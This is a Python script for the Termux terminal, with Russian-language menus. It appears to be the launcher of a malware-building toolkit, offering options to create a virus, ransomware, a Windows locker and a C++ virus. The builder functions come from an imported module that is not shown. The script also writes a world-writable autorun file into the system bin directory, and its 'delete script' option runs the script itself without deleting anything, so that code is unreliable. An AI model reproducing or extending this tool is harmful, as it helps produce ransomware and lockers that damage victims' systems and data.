#modules
from module.module import *
from colorama import *
import os,sys
#varible
top = '''
   ██
 ███████    ▄████▄   ██▄███▄
   ██      ██▀  ▀██  ██▀  ▀██
   ██      ██    ██  ██    ██
   ██▄▄▄   ▀██▄▄██▀  ███▄▄██▀
    ▀▀▀▀     ▀▀▀▀    ██ ▀▀▀
                     ██
'''
lines = '========================================'
info = '''
версия:0.0.1
интернет:нужен
лицензия:не нужна
обновлений:0
выполнин:python
сделан:в России
автор:артём
вк:нету
телеграмм:есть но не дам
электроный адрес:artemrezanov56@mail.ru
'''
menu = '''
[1]-создать вирус
[2]-создать шифровальщик
[3]-создать винлокер
[4]-создать вирус(cpp)
[5]-спарсить html-код с сайта
[6]-инсталлер
[7]-удалить скрипт
[8]-выход
'''
os.system('clear')
def auto():
	with open('/data/data/com.termux/files/usr/bin/auto','w') as autorun:
		autorun.write('''
clear
python /data/data/com.termux/files/home/python_script/script.py
''')
	os.system('chmod 777 /data/data/com.termux/files/usr/bin/auto')
def main():
	print(Fore.GREEN + lines)
	print(Fore.RED + top)
	print(Fore.GREEN + lines)
	print(Fore.YELLOW + info)
	print(Fore.GREEN + lines)
	print(Fore.BLUE + menu)
	what = input('root@auto|> ')
	if what == '1':
		make_virus()
	elif what == '2':
		make_chipher()
	elif what == '3':
		make_winlocker()
	elif what == '4':
		make_cpp()
	elif what == '5':
		pars()
	elif what == '6':
		installer()
	elif what == '7':
		os.system(sys.argv[0])
	elif what == '8':
		pass
	if not os.path.exists('/data/data/com.termux/files/usr/bin/auto'):
		auto()
main()
